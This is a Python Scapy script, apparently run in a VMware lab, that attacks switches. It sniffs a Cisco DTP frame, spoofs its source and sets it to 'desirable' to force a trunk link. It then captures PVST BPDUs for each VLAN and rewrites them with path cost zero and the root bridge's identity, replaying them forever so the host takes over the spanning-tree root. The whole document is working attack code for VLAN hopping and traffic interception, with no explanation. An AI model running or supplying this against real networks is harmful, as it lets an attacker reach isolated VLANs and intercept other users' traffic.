from scapy.all import *
load_contrib("dtp")

# INTERCEPT DTP PACKET
intercept_dtp_packet = False

while intercept_dtp_packet == False:

    try:
        dtp_packet = sniff(filter = "ether dst 01:00:0c:cc:cc:cc", count = 1, iface = "VMware Network Adapter VMnet1")

        if dtp_packet[0]["DTP"]:
            intercept_dtp_packet = True

    except:
        pass

# MANIPULATE DTP DESIRABLE PACKET
dtp_packet[0].src = "00:00:00:00:00:11"
dtp_packet[0]["DTP"]["DTPStatus"].status = '\x03'
dtp_packet[0]["DTP"]["DTPType"].dtptype = '\x25'

sendp(dtp_packet[0], loop = 0, verbose = 1, iface = "VMware Network Adapter VMnet1")

# INTERCEPT AND MANIPULATE PVST PACKETS
n_stp_packets = 10
stp_vlanids = []
stp_id_packet = []

stp_packet = sniff(filter = "ether dst 01:00:0c:cc:cc:cd", count = n_stp_packets, iface = "VMware Network Adapter VMnet1")

for i in range(n_stp_packets):

    vlanid = stp_packet[i]["STP"].bridgeid % 4096

    if vlanid not in stp_vlanids:
        
        stp_vlanids.append(vlanid)
        stp_id_packet.append(i)

while True:

    for i in range(15):

        for j in stp_id_packet:

            stp_packet[j].src = "00:00:00:00:00:11"
            stp_packet[j]["STP"].bpduflags = 60
            stp_packet[j]["STP"].pathcost = 0
            stp_packet[j]["STP"].bridgeid = stp_packet[j]["STP"].rootid
            stp_packet[j]["STP"].bridgemac = stp_packet[j]["STP"].rootmac
            stp_packet[j]["STP"].portid = 1
        
            sendp(stp_packet[j], loop = 0, verbose = 1, iface = "VMware Network Adapter VMnet1")
    
        time.sleep(2)

    sendp(dtp_packet[0], loop = 0, verbose = 1, iface = "VMware Network Adapter VMnet1")